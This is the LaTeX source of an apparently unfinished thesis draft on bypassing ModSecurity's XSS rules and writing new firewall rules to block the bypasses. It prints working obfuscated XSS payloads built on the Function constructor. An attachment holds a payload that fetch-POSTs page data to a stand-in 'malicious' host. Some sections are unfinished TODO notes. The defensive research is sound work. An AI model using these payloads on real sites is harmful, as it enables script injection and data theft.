<payload>[].constructor.constructor('var s = "secret";promp' + 't("something", s)')()</payload>
<message>"XSS JavaScript function with constructor"</message>
<file>"/rules/REQUEST-000-XSS-PROPOSAL.conf"</file>
<fileDetails>[line "13"] [id "2"]<fileDetails>
<MatchedData>"[].constructor.constructor("</MatchedData>
\end{lstlisting}

Equally, the bypassing payloads using dot notation that have been discovered in Section~\ref{sec:avoidingbypassA} and  Section~\ref{sec:avoidingbypassB} are now being detected by the evaluated firewall. Section~\ref{sec:avoidingbypassA}: Avoiding () bypass:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=avoiding () bypass payload using dot notation blocked, label={lst:constructorsblockedpoc}]
<payload>[].constructor.constructor`a${'var s = "secret";promp' + 't`something\u{0024}{s}`'}```</payload>
<message>"XSS JavaScript function with constructor"</message>
<file>"/rules/REQUEST-000-XSS-PROPOSAL.conf"</file>
<fileDetails>[line "13"] [id "2"]<fileDetails>
<MatchedData>"[].constructor.constructor`"</MatchedData>
\end{lstlisting}

Section~\ref{sec:avoidingbypassB}: Avoiding {} bypass:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=using constructors rule poc, label={lst:constructorsblockedpoc}]
<payload>[].constructor.constructor('pro' + 'mpt`seeValueInInput$' + [open + []][0][16] + '2+2' + [open + []][0][36] + ':`')();</payload>
<message>"XSS JavaScript function with constructor"</message>
<file>"/rules/REQUEST-000-XSS-PROPOSAL.conf"</file>
<fileDetails>[line "13"] [id "2"]<fileDetails>
<MatchedData>"[].constructor.constructor("</MatchedData>
\end{lstlisting}

The proposed firewall rule manages to block a part the mentioned bypassing payloads. The sections Section~\ref{sec:funconstrconbypass}, Section~\ref{sec:avoidingbypassA} and Section~\ref{sec:avoidingbypassB} further state similar payloads created using the square bracket notation. These are not detected and filtered by the proposed rule with \verb|id:2|.

To block requests using the function contructor via square bracket notation, another firewall rule \verb|id:3| is proposed:

\begin{lstlisting}[style=basicStyle, caption=rule proposal to block usage of function constructor via square bracket notation, label={lst:constructorsruleproposalB}]
SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* "@rx (?i)(?:(?:\[[^\]]*\])|(?:\{[^}]*\}))\[[`,',\"][a-z]*[`,',\"]\]\[[`,',\"]constructor[`,',\"]\][`,(,\[]" \
    "id:3,\
    phase:2,\
    auditlog,\
    capture,\
    t:none,t:urlDecodeUni,t:compressWhitespace,\
    msg:'XSS JavaScript function with constructor (square bracket notation)',\
    logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\
    tag:'application-multi',\
    tag:'language-multi',\
    tag:'attack-xss',\
    tag:'xss-perf-disable',\
    tag:'paranoia-level/1',\
    severity:'CRITICAL', \
    setvar:'tx.xss_score=+%{tx.critical_anomaly_score}',\
    setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
\end{lstlisting}

The rule with \verb|id:3| shown in Listing~\ref{lst:constructorsruleproposal} aims at matching usage of the function constructor via square bracket notation using the following regular expression:

\begin{lstlisting}[style=basicStyle, caption=regex of proposed rule id:2, label={lst:constructorsruleproposalregexB}]
(?i)(?:(?:\[[^\]]*\])|(?:\{[^}]*\}))\[[`,',"][a-z]*[`,',"]\]\[[`,',"]constructor[`,',"]\][`,(,\[]

explanation:
(?i)(?:(?:\[[^\]]*\])|(?:\{[^}]*\}))    equal to the previous regular expression used in proposed rule with id:2

\[    match a single opening square bracket
[     start a list
`,'," match ticks indicating a string
]     end the list
[     start a list
a-z   match a single character between a (index 97) and z (index 122)
]     end the list
*     match the characters from the list (anything from a to z) between 0 and unlimited times
[     start a list
`,'," match ticks indicating a string
]     end the list
\]    match a single closing square bracket

\[    match a single opening square bracket
[     start a list
`,'," match ticks indicating a string
]     end the list
constructor     match on the word "constructor"
[     start a list
`,'," match ticks indicating a string
]     end the list
\]    match a single closing square bracket

[     start a list
`,(,\[         match on a single `, opening round bracket or opening square bracket
]     end the list
\end{lstlisting}

The two payload options of: \\
\verb|[]['something']['constructor']()| and \verb|{}['something']['constructor']()| \\
are matched by this regular expression. Therefore, once the configuration is updated with the proposed rule, the bypassing payload using square bracket notation that has been discovered in Section~\ref{sec:funconstrconbypass} is being detected by the evaluated firewall:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=function constructor bypass payload using square bracket notation blocked, label={lst:constructorsblockedsbn}]
<payload>[]['constructor']['constructor']('var s = "secret";promp' + 't("something", s)')()</payload>
<message>"XSS JavaScript function with constructor (square bracket notation)"</message>
<file>"/rules/REQUEST-000-XSS-PROPOSAL.conf"</file>
<fileDetails>[line "30"] [id "3"]<fileDetails>
<MatchedData>"[]['constructor']['constructor']("</MatchedData>
\end{lstlisting}

Equally, the bypassing payloads using square bracket notation that have been discovered in Section~\ref{sec:avoidingbypassA} and  Section~\ref{sec:avoidingbypassB} are now being detected by the evaluated firewall. Section~\ref{sec:avoidingbypassA}: Avoiding () bypass:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=avoiding () bypass payload using square bracket notation blocked, label={lst:constructorsblockedsbnA}]
<payload>[]['constructor']['constructor']`a${'var s = "secret";promp' + 't`something\u{0024}{s}`'}```</payload>
<message>"XSS JavaScript function with constructor"</message>
<file>"/rules/REQUEST-000-XSS-PROPOSAL.conf"</file>
<fileDetails>[line "13"] [id "2"]<fileDetails>
<MatchedData>"[].constructor.constructor`"</MatchedData>
\end{lstlisting}

Section~\ref{sec:avoidingbypassB}: Avoiding {} bypass:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=avoiding {} bypass payload using square bracket notation blocked, label={lst:constructorsblockedsbnB}]
<payload>[]['constructor']['constructor']('pro' + 'mpt`seeValueInInput$' + [open + []][0][16] + '2+2' + [open + []][0][36] + ':`')();</payload>
<message>"XSS JavaScript function with constructor"</message>
<file>"/rules/REQUEST-000-XSS-PROPOSAL.conf"</file>
<fileDetails>[line "13"] [id "2"]<fileDetails>
<MatchedData>"[].constructor.constructor("</MatchedData>
\end{lstlisting}

The proposed firewall rule manages to block the second part the mentioned bypassing payloads. Using proposed rules \verb|id:2| and \verb|id:3|, all discovered payloads in sections Section~\ref{sec:funconstrconbypass}, Section~\ref{sec:avoidingbypassA} and Section~\ref{sec:avoidingbypassB} are successfully blocked.

While accessing the function constructor as it is done in the mentioned bypassing payloads is no longer possible with the proposed rule, the practice of creating firewall evading payloads through accessing the function constructor by accessing the constructor of JavaScripts built-in objects will still yield successful results. Not all vectors opened by this technique are covered by the proposed rules with \verb|id:2| and \verb|id:3|. Creating an Array object by calling \verb|new Array()| is equivalent to calling \verb|[]| in terms of creating a malicious payload that accesses the function constructor.
Coverage can be achieved by removing the first part of the regular expression mentioned under Listing~\ref{lst:constructorsruleproposalregexA}, such that only the following remains:

\begin{lstlisting}[style=basicStyle, caption=reduced regex of proposed rule id:2, label={lst:constructorsruleproposalregexA}]
(?i)[a-z]*\.constructor[`,(,\[]
\end{lstlisting}

The reduced regular expression matches on any payload that includes \verb|.constructor| followed by one of the characters \verb|`([|. This rule matches on the payload

\begin{lstlisting}[style=basicStyle]
[].constructor.constructor()
\end{lstlisting}

as well as the payload

\begin{lstlisting}[style=basicStyle]
new Array().constructor.constructor()
\end{lstlisting}

As it would flag the following benign payload that contains an example blog post
\begin{lstlisting}[style=basicStyle]
Objects in JavaScript are often created using
a.constructor.constructor(a special method of a class)
can be used to initialize instances with variable properties.
\end{lstlisting}
as malicious, using the reduced regular expression can be considered to general to be used in certain environments. 

Deciding between using the full regular expression stated in Listing~\ref{lst:constructorsruleproposalregexA} and its reduced variant forces the decision between the increased risk of allowing certain malicious to bypass the firewall or the increased risk of false positives. It points to the required balancing act between the two risks.

TODO: force . bzw [] vor reduced regex






{\color{blue}kurzer test hat ergeben: das geht auch: Proxy.constructor.constructor('al' + 'ert("Proxy")')(); }




{\color{red}Ideen bisher:}

Unicode Normalization: ModSec WAF uses transformers to decode URL encoded payloads before they are checked against the ruleset, they same could be done with unicode normalization. normalize according to NFKC and then check the request against the ruleset

Regex to detect and block \verb|["something(any array or object function)"]["constructor"]|

Regex to detect and block \verb|["something(any array or object function)"].constructor|






{\color{red} TODO: mehr in form von: Considering evaluation result [ref], it a rule in the form of [listing] could potentially avoid a bypass using the technique [ref]}


	\newpage
	\section{Generic Evaluation Proposal}
\label{sec:proposal}
As seen in Section~\ref{sec:EvaluationResults}: Evaluation Results, when evaluating web application firewalls with firewall evasion techniques, an iterative approach to developing payloads seems to be a good solution. If the evaluation is done from the perspective of an firewall administrator, access to logs is possible. Using the approach from Section~\ref{sec:evaluation}: Evaluation, bypassing payloads can be developed quickly if the log message and specific matched part of the payload is known. Once a bypassing payload has been successfully developed and tested against the firewall that is to be evaluated, knowledge about possible loopholes is gained and counter measures can be implemented. As stated in Section~\ref{sec:evalinterpretation}: Interpretation of Evaluation Results, even if there is no immediate possibility to implement rules based on the discovered bypass, the knowledge gained can be valuable. Based on what was described in Section~\ref{sec:evaluation}: Evaluation and the results thereof (Section~\ref{sec:EvaluationResults}: Evaluation Results), the following generic evaluation approach is proposed.

\subsection{Proposed step 1: Gathering evasion techniques}
As a first step, research into specific evasion techniques covering the used technologies by a web application that is to be protected by the evaluated firewall is conducted. If the web application uses a NoSQL database, evasion techniques specific to obscuring SQL-injection payloads are ignored in favor of evasion techniques specific to obscuring NoSQL-injection payloads. As detailed in Section~\ref{sec:varioustech}: Various Payloads, some evasion techniques are not specific to any kind of (injection-) attack and can be considered more broadly.

\subsection{Proposed step 2: Single iteration evaluation}
After evasasion techniques to be evaluated against the tested firewall have been chosen, they are used to create proof-of-concept payloads in a separate fashion. Every evasion technique is evaluated against the firewall configuration by itself. The crafted payloads are subsequently tested against the firewall while analyzing the firewall log to take note on which payloads show potential to be used within a multi iteration approach. Potential can be classified in 3 different classes: unsuable, semi-usable and full potential. Only semi-usable and full potential evasion techniques are used within the following multi iteration approach.

Taking the results from Section~\ref{sec:casealternationevaluation}: Case Alternation as an example: The log file created by the ModSecurity firewall shows that this evasion technique is to be classified as unusable. When sending a request with a proof-of-concept payload, the log reveals that the regex rule used to filter out the payload is configured to ignore case. As such, this techniques has no effect on any payload sent.

Taking the results from Section~\ref{sec:taggedtemplateliteralsevaluation} as another example: While the evasion technique can be used to send a bypassing proof-of-concept payload in the form of \verb|alert`XSS`| towards the web application, by the way Tagged Template Literals are implemented in JavaScript, some payload limitations incur when using this technique. In the example, because of using Tagged Template Literals, the function \verb|alert()| can no longer be called with a variable given as a parameter. Payload limitations incurred by using Tagged Template Literals are further discussed in Section~\ref{sec:payloadlimitations}: Payload Limitations {\color{red}TODO: wenn section payload limitations removed wird, hier auf firewall evasion fundamentals section hinweisen}. Considering incurred payload limitations, using Tagged Template Literals as an evasion technique is classified semi-usable.

Taking the results from Section~\ref{sec:aurebeshevaluation}: Aurebesh as a third example: Using the Aurebesh evasion technique, the proof-of-concept payload \verb|prompt(1,2)| can be sent without any incurring limitations. As such, using Aurebesh as an evasion technique is classified with full potential.

\subsection{Proposed step 3: Multi iteration evaluation}
\label{sec:genericproposalstep3}
Once evasion techniques showing potential have been discovered by using the proof-of-concept payloads crafted in Step 2, multi iteration evaluation can begin. Initially, payloads of interest are researched or crafted. To keep it relevant, these payloads need to have possible malicious influence on the web application that is to be protected by the evaluated firewall. As in the proposed step 1, the technologies used by the web application are considered when deciding on payload variants. Taking a banking web application using JavaScript in the Frontend as an example, Cross-site-scripting payloads are of interest. Once a payload that could negatively influence the web application is found, iteratively applying the noted evasion techniques from proposed step 2 can begin. Multi iteration evaluation is started by sending the plain, not-yet-obscured payload towards the web application and subsequently analyzing the firewall log. As stated in Section~\ref{sec:evaluation}: Evaluation, each iteration begins with analyzing the firewall log of filtered/rejected requests for matched parts of the payload. Once these parts have been identified, an evasion technique classified as usable in proposed step 2 is used to obscure these parts of the payload. During application of an evasion technique to the payload, the payload needs to be kept valid. The validity of the payload is tested at each iteration. Once the payload has been obscured, it is sent towards to web application. Subsequently checking the firewall logs marks the beginning of the next iteration. If at any iteration the payload passes the filter of the firewall, a new bypassing payload has been discovered.

\subsection{Proposed step 4: Implementing new firewall rules}
With the found bypassing payload from proposed step 3 and the knowledge about the evasion techniques used, new rules to extend the firewall configuration can be established. The crafting of new rules at this point is based on the gained knowledge. Knowing the bypassing payload as well as all applied evasion techniques, it is possible to craft a rule that detects at least one of the applied evasion techniques and therefore can cause the firewall to block the obscured payload. 
Taking the evaluation result of Section~\ref{sec:funconstrconbypass}: Function Constructor + String Concatenation as an example: Rules can be implemented that detect the usage of the function constructor as used in Section~\ref{sec:funconstrconbypass}. This blocks the request as payloads using the mentioned syntax of the bypassing payloads will be detected once this rule is implemented. This specific example is further detailed in the rule proposal under Section~\ref{sec:rulespropfunctionconstructor}: Function Constructor (Results).

Once rules for a specific payload have been developed and implemented, these rules are reflected on the used evasion techniques. Some evasion techniques allow for mutiple vectors to create bypassing payloads. The coverage provided by the newly implemented rules is assessed and potentially additionally found vectors for bypassing payloads are noted down to be used in the next evaluation step. 
\subsection{Continuing the Evaluation}
Finally, the new rules are tested against the found bypassing payloads to verify their detection. After verifying the rules, either the evaluation comes to an end or is continued at the initial phase of Section~\ref{sec:genericproposalstep3}: Proposed step 3: Multi iteration evaluation. If additional vectors for bypassing payloads have been found during the previous step, these are handled first. Handling these first allows to focus on one evasion technique at a time. As shown in Section~\ref{sec:rulespropfunctionconstructorreflection}, more vectors to use the \verb|Function()| constructor were discovered. As such, the focus lied on those during the next evaluation iteration. Once the rule proposed under Section~\ref{sec:rulespropfunctionconstructorreflection} in Listing~\ref{lst:constructorsruleproposal3} was implemented, the focus shifted to the additional proposals stated under Section~\ref{sec:unicodenormprop}, Section~\ref{sec:htmlcharrefprop} and Section~\ref{sec:jsescprop}.

\subsection{Assessment} 
During the evaluation of the ModSecurity firewall using CRS4.1 against targeted Cross-site scripting payloads, which was performed according to the proposal stated in this section, multiple insights were gained. It was shown that from initially 18 gathered evasion technique, 13 evasion techniques could be used in some combination to create bypassing payloads. Evaluation results described under Section~\ref{sec:singleiterationeva} and Section~\ref{sec:multiiteration} state some definitively bypassing payloads that the evaluated firewall configuration could not protect against. With this, knowledge about weaknesses in the ruleset has been gained. In addition to that, less and more impactful evasion techniques could be identified. Some evasion techniques were altogether ineffective, while others offered a multitude of bypassing vectors. Based on the gained combined knowledge of bypassing payloads and multiple bypassing vectors, additional firewall rules could be proposed that would increase the protection by the firewall configuration.

For a complete overview regarding a specific Web application, all potentially malicious payloads based on the used Web technologies powering the Web application to be protected need to be investigated in a similar manner. Nevertheless, the results of evaluating only Cross-site scripting payloads allow an estimation of the firewall performance against the focused Cross-site scripting payloads. No matter if a complete evaluation investigating multiple potential weaknesses or an evaluation investigating only one weakness is conducted, using the proposed evaluation technique allows to explore potential loopholes in the rules configuration in any case. This gives insight into filtering performace and subsequently allows to close those loopholes by implementing new rules.
Depending on the specific web application that is to be protected by the web application firewall, adding rules that completely block some evasion techniques that were detected to be effective might be possible. If that is not the case, it could be possible to blacklist payloads that were discovered during the evaluation. At least, some discovered bypassing payloads are known after the evaluation. With this knowledge, the web application can be fortified using a different methodology to adding firewall filtering rules. If nothing is to be done about the findings, still the knowledge gained about bypassing payloads can be used to estimate the risk posed to the web application.

Furthermore, during the evaluation according to the proposal stated in this section, advantages and disadvantages of this technique became apparent. As every step of this proposal is dependend on the subjects performing the evaluation, it is not predefined which evasion techniques will be used to evaluate. In the first step, some Web technologies that the Web application to protect uses could be missed. Building on this, some evasion techniques existent to create bypassing payloads, which would maliciously influence a Web application using a certain Web technology, could also be missed. 
This could lead to some evasion techniques not being used during the evaluation and subsequently to missed potential bypassing vectors to craft malicious payloads. In addition to that, some malicious payloads could might be missed during the evaluation of known evasion techniques. 
Therefore, this evaluation method does not guarantee full coverage. 
Especially during multi-iteration-evaluation, there are many possible evasion technique combinations. If the evaluation is done manually, the subjectively most promising technique combinations can be used. Should this not yield expected results, a fallback on evaluating using any possible combination is possible.
If a firewall configuration does not block some payloads obscured by certain evasion techniques, incurred payload limitations through using those techniques might be enough to render a bypassing payload invalid. In such a case, the validity of bypassing payloads depends on the implementation details of the web server receiving the requests. 
If this implementation eventually invalidates bypassing payloads, a web application firewall ruleset that does not block all payloads but only allows invalid payloads to bypass might be considered effective at the time of evaluation although the invalidity of payload is based only on implementation details of the web application to be protected. 
If those details change, it is possible that the evaluated firewall configuration suddenly no longer "protects" against some evasion techniques.

Performing the evaluation in a grey box testing manner allowed access to the firewall log file. Access to the firewall log enabled to analyze the rules that matched on a payload and apply target-oriented evasion techniques in subsequent iterations. Developing bypassing payloads in this manner enabled to find weaknesses and subsequently implement measures to avoid discovered bypass vectors. Analyzing the matching rules during each iteration also enabled to discard some evasion techniques from consideration in following iterations. This is the case when some evasion techniques are effectively countered through certain rule configurations. 



	\newpage
	\section{Conclusion}
\label{sec:conclusion}
Firewall evasion is a tricky topic. A lot of influencing factors: Firewall, Configuration, Payload (Language, Type, Input Options), Blackbox or Whitebox. {\color{red}TODO}

Hier nochmal zusammenfassung der ergebnisse und rotem faden


	\newpage
	\section{Continuations}
\label{sec:continuations}
During the evaluations laid out under Section~\ref{sec:singleiterationeva}: Single Iteration Evaluation and Section~\ref{sec:multiiteration}: Multi Iteration Evaluation, it became apparent that programmatic automation to create and modify the payloads using selected evasion techniques by user input would improve the process. To achieve this, conventional as well as machine learning approaches to developing an application for this use case are conceivable.

In the conventional approach, initially implementing functions to intelligently parse the firewall log file with the goal of making the application "understand" the part of the payload that got detected would be required. As a next step, the application needs to select a fitting evasion technique to apply. For this, the application needs to understand the payload class. In the context of payload modification, Cross-site-scripting payloads need to be treated differently to sql-injection payloads. Each known evasion technique needs to be defined to the application with its incurred limitations and characteristics. Using Tagged Template Literals for instance (Section~\ref{sec:taggedtemplateliterals}), some payloads are no longer possible.
Once fitting evasion technique has been selected, the evasion technique needs to be programmatically applied to the payload. This requires the application to deeply understand the payload effect and intention as well as know different possibilities to apply an evasion technique depending on the chosen payload. Once the payload has been obscured, it should be tested for validity. The application needs to be able to interpret and evalutate the effects of a payload. Only after these fundamentals are covered can the proposed evaluation technique be implemented into the application. With this, the afromentioned functions could be applied iteratively to the combination of (obscured) payload and firewall log. The steps following what is described under Section~\ref{sec:evaluation}: Evaluation respectively Section~\ref{sec:proposal}: Rule Proposal could thus be automated by such an application. 

The author of this work considers the machine learning approach to automating the proposed evaluation methodology similar to the described conventional approach. Tokenization and context-awareness of Large Language Models could potentially assist in achieving a working implementation of the functions to understand the log messages, understand the payload, understand limitations imposed by certain evasion techniques. To investigate the substance behind this statement, research into this idea seems promising. \\ 
Work by ...  analyzes firewall bypassing payloads by using a machine learning approach involving ... The payloads are ....

{\color{red} TODO: add machine learning research}

	\input{future_work.tex}
	% Quellenverzeichnis
	\newpage
	\printbibliography
	\newpage
	\section{Attachments}
some attachment...


\begin{lstlisting}[style=basicStyle, caption=original payloads, label=lst:originalpayloads]
XSS payloads:
alert("XSS")
<a href="javascript:var secret = document.getElementsByName('name')[0].innerHTML;var data = {body:secret,method:'POST'};fetch('http:\//malicious:3001/api/sendsecret', data)">ClickMeFor$</a>
\end{lstlisting}

	
\end{document}
